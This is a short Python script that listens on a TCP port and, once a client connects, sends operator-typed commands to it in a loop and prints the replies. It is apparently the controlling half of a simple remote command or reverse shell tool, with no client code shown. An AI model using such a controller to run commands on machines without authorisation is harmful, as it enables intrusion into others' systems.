import socket

#creates/binds socket
def socket_creation():
    port = 1234 # <- enter int value of port here

    #creates a socket
    global s
    s = socket.socket()

    #binds to port, and the ip address of this host
    s.bind(('',port))

    #socket is listening
    s.listen(5)
socket_creation()


def commands(conn):
    while True:
        #sends the command to the client
        cmd = input('Enter: ')
        conn.send(str.encode(cmd))

        outp = str(conn.recv(1024).decode())
        print(outp)
        

def establish_conn():
    conn, addr = s.accept()
    commands(conn)

establish_conn()